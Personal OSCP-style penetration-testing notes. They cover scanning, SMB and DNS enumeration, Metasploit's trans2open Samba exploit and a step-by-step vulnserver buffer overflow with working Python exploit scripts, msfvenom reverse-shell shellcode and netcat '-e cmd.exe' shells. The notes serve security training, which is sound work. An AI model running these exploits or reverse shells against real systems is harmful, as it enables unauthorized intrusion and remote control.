**OSCP Notes**

*NetDiscover*

find out the ip of the machine in the network

    netdiscover -i  eth1

**Find ports**

*SSH fast UDP*

    nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oN /root/kioptrix.txt 192.168.156.102

    -sU                         UDP Scan

*SSH intensive* 

    nmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 -oN /root/desktop/kioptrix.txt 192.168.156.102

    -Pn                         Do not ping the host
    -sS                         Stealth Scan
    --stats-every 3m            Every 3 Min information should come back
    --max-retries 1             Only try once
    --max-scan-delay 20         nmap should wait a specific time - avoid rait limit
    --defeat-rst-ratelimit      don't send ack just send rst to much ack can trigger rait limit - for filtered ports
    -T4                         Intesitiy of 4
    -p1-65535                   scan all ports
    -oN <where to save it>      save the result to a specific file
    <target>                    ip e.g.

*Specific Ports Scan*

    sudo nmap -Pn -nvv -p 22,80,8080 --version intensity 9 -A -oN /home/kali/Desktop/kioptrix.txt <host>

    -nvv 
    -Pn
    -p 22,80,111,139
    --version intensity 9 
    -A
    -oN /root/kioptrix1_detailed.txt
    <host>

**Enumeration**

All kind of enumeration topics

**Search for Directories**

*dirbuster - with UI*

Good to download a wordlist from github
take a big one and remove "manual"

*analysis for vulnerabilities*

    nikto -h <ip> + port :80 or :443 

*SMB Enumeration*

    enum4linux -> 
        SMB Client 
        RPC Client
        NAT and MB Lookup

Has config bug
    locate smb.conf
    vim smb.conf

    under global add:
    client use spnego = no
    client ntlmv2 auth = no

*enum4linux <ip>*

find out SAMBA Version

    msfconsole
    search smb

search for an auxiliary scanner for smb with meatsploit

    use auxiliary/scanner/smb/smb_version
    put info - includes show options
    set rhost <ip>
    exploit
    --> gives you the version

    searchsploit samba 2.2
    see exploits compare them to exploit-db

    nbtscan <ip> - gives you basic info like NetBIOS Name

    smbclient -L <ip>

SAMBA is a good source for exploits

*Gaining Root with Metasploit*

    msfconsole
    search trans2open - use linux version
    show targets - there can be a lot of them
    show Options - to see the payload
    
If a static payload is set (to be seen by / in the path it can maybe not work).
Solution is to replace that with a generic payload.

Generic (non staged):

    set payload generic/shell_reverse_tcp

Staged:

    set payload generic/shell/reverse_tcp
    
exploit maybe leads to success
If it fails first try is the payload, then maybe it is the port. 

**DNS Enumeration**

*zonetransfer*

DNS Server

    host -t ns zonetransfer.me

Mail Server

    host -t mx zonetransfer.me

Host Information

    host zonetransfer.me

Zonetransfer information

    host -l zonetransfer.me <name server>

gives you unique dns/ip addresses

*dnsrecon*

    dnsrecon -d zonetransfer.me -t axfr
    axfr - for Zonetransfer

*dnsenum*

    dnsenum zonetransfer.me

its more clean and faster as the other ones

**other types**

    -FTP
    -SNMP
    -SMTP

**NetCat**

try connect to an open port
    
    nc -nv <ip> <port>

listening shell

    nc -nvlp <port>

connect

    nc -nv <ip> <port> -e cmd.exe
    -e execute

**Buffer Overflow**

**Basic**

*Overview*

    Kernel      Top         0xffff
    Stack                               is going down
    Heap                                is going up
    Data
    Text        Button      0000

*Stack*

    ESP (Extended Stack Pointer)                            Top                     
    Buffer Space                                                                
    EBP (Extended Base Pointer)                             Base (B for Base)     
    EIP (Extended instrctuon Pointer) / Return Address                              

Buffer Space goes down. If there an input validation is wrong the EBP and EIP can be reached
Fill the Buffer Space up with x41 (A) x42 (B)

**Creation**

*Fuzzing*

A programm that is not properly sanitized will crash if it receives to many bytes.

To Download

    vulnserver
    Immunity Debugger


First try with fuzzing to find the len of the statement that causes a crash.

*fuzzer script*

    #!/user/bin/python3
    import socket

    vulnserverHost = "192.168.178.60"
    vulserverDefaultPort = 9999
    buffer = ["A"]
    counter = 100
    while len(buffer) <= 30:
        buffer.append("A" * counter)
        counter = counter + 200

    for string in buffer:
        print("Fuzzing vulnserver with bytes: " + str(len(string)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((vulnserverHost, vulserverDefaultPort))
        s.send(('TRUN /.:/' + string).encode())
        s.close()

AF_INET meas IPv4
TRUN is used vulnerable to Bufferoverflow
vulserver has a lot of options that go further

*fuzzing analysis*

open or attach vulnserver in immunity debugger

    ESP is the TOP
    EBP is the BUTTOM
    EIP is the POINTER

The goal is to overwrite the EIP address to point to mallicious code

Try fuzzer again. Debugger will give out an access violation EIP is overwritte with "41414141" so with buzzing reached there and has it overwritten

**Finding the Offset**

*Pattern create*

That is a metasploit module which will generate a sequence that has the requested size

    /usr/share/metasploit-framework/tools/exploit-framework/tools/exploit/pattern_create.rb - l 5900

    l - length

5900 bytes is used because that was the amount that caused the crash while fuzzing

*Create Pattern Script*

    #!/user/bin/python3
    import socket

    vulnserverHost = "192.168.178.60"
    vulserverDefaultPort = 9999

    shellcode = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk6Gk7Gk8Gk9Gl0Gl1Gl2Gl3Gl4Gl5Gl6Gl7Gl8Gl9Gm0Gm1Gm2Gm3Gm4Gm5Gm6Gm7Gm8Gm9Gn0Gn1Gn2Gn3Gn4Gn5Gn6Gn7Gn8Gn9Go0Go1Go2Go3Go4Go5Go6Go7Go8Go9Gp0Gp1Gp2Gp3Gp4Gp5Gp6Gp7Gp8Gp9Gq0Gq1Gq2Gq3Gq4Gq5Gq6Gq7Gq8Gq9Gr0Gr1Gr2Gr3Gr4Gr5Gr6Gr7Gr8Gr9Gs0Gs1Gs2Gs3Gs4Gs5Gs6Gs7Gs8Gs9Gt0Gt1Gt2Gt3Gt4Gt5Gt6Gt7Gt8Gt9Gu0Gu1Gu2Gu3Gu4Gu5Gu6Gu7Gu8Gu9Gv0Gv1Gv2Gv3Gv4Gv5Gv6Gv7Gv8Gv9Gw0Gw1Gw2Gw3Gw4Gw5Gw6Gw7Gw8Gw9Gx0Gx1Gx2Gx3Gx4Gx5Gx6Gx7Gx8Gx9Gy0Gy1Gy2Gy3Gy4Gy5Gy6Gy7Gy8Gy9Gz0Gz1Gz2Gz3Gz4Gz5Gz6Gz7Gz8Gz9Ha0Ha1Ha2Ha3Ha4Ha5Ha6Ha7Ha8Ha9Hb0Hb1Hb2Hb3Hb4Hb5Hb6Hb7Hb8Hb9Hc0Hc1Hc2Hc3Hc4Hc5Hc6Hc7Hc8Hc9Hd0Hd1Hd2Hd3Hd4Hd5Hd6Hd7Hd8Hd9He0He1He2He3He4He5He6He7He8He9Hf0Hf1Hf2Hf3Hf4Hf5Hf6Hf7Hf8Hf9Hg0Hg1Hg2Hg3Hg4Hg5Hg6Hg7Hg8Hg9Hh0Hh1Hh2Hh3Hh4Hh5Hh6Hh7Hh8Hh9Hi0Hi1Hi2Hi3Hi4Hi5Hi6Hi7Hi8Hi9Hj0Hj1Hj2Hj3Hj4Hj5Hj6Hj7Hj8Hj9Hk0Hk1Hk2Hk3Hk4Hk5Hk6Hk7Hk8Hk9Hl0Hl1Hl2Hl3Hl4Hl5Hl6Hl7Hl8Hl9Hm0Hm1Hm2Hm3Hm4Hm5Hm6Hm7Hm8Hm9Hn0Hn1Hn2Hn3Hn4Hn5Hn6Hn7Hn8Hn9Ho0Ho1Ho2Ho3Ho4Ho5Ho'

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((vulnserverHost, vulserverDefaultPort))
        s.send(('TRUN /.:/' + shellcode).encode())
    except:
        print("check debugger")
    finally:
        s.close()


*find the offset*

Save the resulting EIP from immunity Debugger after crash

    EIP 386F4337

Now try to put that into the offset

    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5900 -q 386F4337
    l - length
    q - EIP value

That gives an exact match at offset 2003 bytes

**Overwriting the EIP**

Try to overwrite the EIP with 4xB (0x42) controlled

    #!/user/bin/python3
    import socket

    vulnserverHost = "192.168.178.60"
    vulnserverDefaultPort = 9999

    shellcode = "A" * 2003 + "B" * 4

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((vulnserverHost, vulnserverDefaultPort))
        s.send(('TRUN /.:/' + shellcode).encode())
    except:
        print("check debugger")
    finally:
        s.close()

Immunity Debugger should look point should 42424242 for EIP

**Finding Bad Characters**

NULL Byte is always bad.

Getting a list:
https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/ 

Remove the \x00 from the list as it is the NULL Byte

Add the Badchars to the shellcode

    #!/user/bin/python3
    import socket

    vulnserverHost = "192.168.56.1"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    badchars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
        "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
        "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
        "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
        "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
        "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
        "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

    shellcode = "A" * 2003 + "B" * 4 + badchars

    try:
        connect = s.connect((vulnserverHost, 9999))
        s.send(('TRUN /.:/' + shellcode).encode())
    except:
        print("check debugger")

    s.close()

Immunity Debugger - click on ESP - follow in Dump
This has a pattern of counting up. 
After 42424242 search in the badchars if anything is missing in the list.
If anything is missing or wrong that is a bad character. 
Go through and note all the bad characters.
Vulnserver only has the null byte as bad char.

**Finding the Right Module**

*Mona*

 Download mona module

 https://github.com/corelan/mona 

 put mona.py into immunity debugger/PyCommands folder.

 Search in Immunity Debugger

    !mona modules

Look in the module info table for all "false" entries. 
And preferable it should be a dll also good if it runs with vulnserver

ASLR would randomize the base address on every start on the system.

    essfunc.ddl

Go to Kali and look for the upcode equivalent (convert Assembly language in HEX Code)

    /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
    in Nasm shell:
        JMP ESP 
    gives you *FFE4*
    (result is always the same)

Go back to immunity debugger

    !mona find -s "\xff\xe4" -m essfunc.dll

    -s upcode equivialent 
    -m module to use

That gives you a list of possible return addresses 

    0x625011af

Back to Kali to write the actual expoit
the address has to be written backwards (little indian)
Because the low memory byte is stored in the lowest adress in x64 architecture and the high order byte is the highest address

    #!/user/bin/python
    import socket

    vulnserverHost = "192.168.178.60"
    vulnserverDefaultPort = 9999
    shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((vulnserverHost, vulnserverDefaultPort))
        s.send('TRUN /.:/' + shellcode)
    except:
        print("check debugger")
    finally:
        s.close()

Back to Immunity Debugger we need to find the JMP ESP.

    Click the Black Arrow with 4 dots and enter the address
    625011af

That should bring the FFE4 - JMP ESP. It is needed to test that.
Select the live press F2 to create a Breakpoint in Immunity Debugger.

*!In order to work properly the module has to be executed in python2.7 ad probably on console*

Python3 causes random signs to show up in the EIP (C2) that will destroy the return value.

    EIP 625011AF essfunc.625011AF 

should be inside the Debug registers

**Generate Shellcode & Gaining Root**

*generate the shellcode*

In kali use msfvenom to generate shellcode

    msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.6 LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"

    EXITFUNC - for stability#
    -f c - generate c shellcode
    -a x86 - for architecture
    -b - bad characters (add as collected in former section) here only NULL byte is bad
    
Maybe the payload is to big that has to be checked here.

*Write the exploit*

With that shellcode the exploit has to be written

    #!/user/bin/python
    import socket

    vulnserverHost = "192.168.178.60"
    vulnserverDefaultPort = 9999

    exploit = (
        "\xba\x72\xc2\xd0\x94\xd9\xc8\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
        "\x52\x31\x57\x12\x03\x57\x12\x83\x9d\x3e\x32\x61\x9d\x57\x31"
        "\x8a\x5d\xa8\x56\x02\xb8\x99\x56\x70\xc9\x8a\x66\xf2\x9f\x26"
        "\x0c\x56\x0b\xbc\x60\x7f\x3c\x75\xce\x59\x73\x86\x63\x99\x12"
        "\x04\x7e\xce\xf4\x35\xb1\x03\xf5\x72\xac\xee\xa7\x2b\xba\x5d"
        "\x57\x5f\xf6\x5d\xdc\x13\x16\xe6\x01\xe3\x19\xc7\x94\x7f\x40"
        "\xc7\x17\x53\xf8\x4e\x0f\xb0\xc5\x19\xa4\x02\xb1\x9b\x6c\x5b"
        "\x3a\x37\x51\x53\xc9\x49\x96\x54\x32\x3c\xee\xa6\xcf\x47\x35"
        "\xd4\x0b\xcd\xad\x7e\xdf\x75\x09\x7e\x0c\xe3\xda\x8c\xf9\x67"
        "\x84\x90\xfc\xa4\xbf\xad\x75\x4b\x6f\x24\xcd\x68\xab\x6c\x95"
        "\x11\xea\xc8\x78\x2d\xec\xb2\x25\x8b\x67\x5e\x31\xa6\x2a\x37"
        "\xf6\x8b\xd4\xc7\x90\x9c\xa7\xf5\x3f\x37\x2f\xb6\xc8\x91\xa8"
        "\xb9\xe2\x66\x26\x44\x0d\x97\x6f\x83\x59\xc7\x07\x22\xe2\x8c"
        "\xd7\xcb\x37\x02\x87\x63\xe8\xe3\x77\xc4\x58\x8c\x9d\xcb\x87"
        "\xac\x9e\x01\xa0\x47\x65\xc2\xc5\x97\x67\x14\xb2\x95\x67\x09"
        "\x1e\x13\x81\x43\x8e\x75\x1a\xfc\x37\xdc\xd0\x9d\xb8\xca\x9d"
        "\x9e\x33\xf9\x62\x50\xb4\x74\x70\x05\x34\xc3\x2a\x80\x4b\xf9"
        "\x42\x4e\xd9\x66\x92\x19\xc2\x30\xc5\x4e\x34\x49\x83\x62\x6f"
        "\xe3\xb1\x7e\xe9\xcc\x71\xa5\xca\xd3\x78\x28\x76\xf0\x6a\xf4"
        "\x77\xbc\xde\xa8\x21\x6a\x88\x0e\x98\xdc\x62\xd9\x77\xb7\xe2"
        "\x9c\xbb\x08\x74\xa1\x91\xfe\x98\x10\x4c\x47\xa7\x9d\x18\x4f"
        "\xd0\xc3\xb8\xb0\x0b\x40\xd8\x52\x99\xbd\x71\xcb\x48\x7c\x1c"
        "\xec\xa7\x43\x19\x6f\x4d\x3c\xde\x6f\x24\x39\x9a\x37\xd5\x33"
        "\xb3\xdd\xd9\xe0\xb4\xf7")

    shellcode = ("A" * 2003) + "\xaf\x11\x50\x62" + "\x90" * 32 + exploit

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((vulnserverHost, vulnserverDefaultPort))
        s.send('TRUN /.:/' + shellcode)
    except:
        print("check debugger")
    finally:
        s.close()

 
Add \x90*32 (for no operation = NOP) as padding so return won't interfer with the exploit code.
The CPU will just forward over NOP in the Stack until it finds the next suitable instruction

*Execute*

Setup a Netcat listening port.

    nc -nvlp 4444

then run the exploit and trigger the reverse shell

    whoami can find out well who is connected

**Compiling an Exploit**

google the exploit Samba 2.2.2a (was the result of first attack vector with metasploit)
https://www.exploit-db.com/exploits/10
Download the exploit

    gcc 10.c -o trans2open
    ./trans2open -b 0 10.0.2.5

Should give you root access
























     









